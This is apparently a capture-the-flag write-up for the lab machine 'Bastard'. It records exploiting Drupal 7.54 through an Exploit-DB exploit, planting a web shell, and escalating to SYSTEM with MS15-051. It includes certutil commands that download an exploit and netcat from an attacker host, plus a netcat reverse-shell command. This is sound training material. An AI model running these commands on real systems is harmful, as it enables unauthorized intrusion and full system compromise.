# BASTARD

web server hosting a drupal 
- http://10.10.10.9/node/1
- http://10.10.10.9/rest
```
Services Endpoint "rest_endpoint" has been setup successfully.
```

cant create account 
```
Unable to send e-mail. Contact the site administrator if the problem persists.
```

from http://10.10.10.9/changelog.txt we can see it's a Drupal 7.54

googeling "Drupal 7.54 exploit"
```
https://www.exploit-db.com/exploits/41564
```

lets be fancy and inject pownyshell 
we are nt authority\iusr so lets grab the user.txt

systeminfo tells us Microsoft Windows Server 2008 R2 Datacenter

found this 
```
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
```
after downloading it to the machine 
```
certutil -urlcache -f http://10.10.14.28:8000/ms15-051x64.exe ms15-051x64.exe
```
we can see that this one is working
```
C:\inetpub\drupal-7.54>ms15-051x64.exe whoami
ms15-051x64.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1152 created.
==============================
nt authority\system
```

we need to download netcat 
```
certutil -urlcache -f http://10.10.14.28:8000/nc64.exe nc64.exe
```

Lets get a reverseshell
```
ms15-051x64.exe "nc64.exe -e cmd 10.10.14.28 4444"
```

and we are root 
```
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```
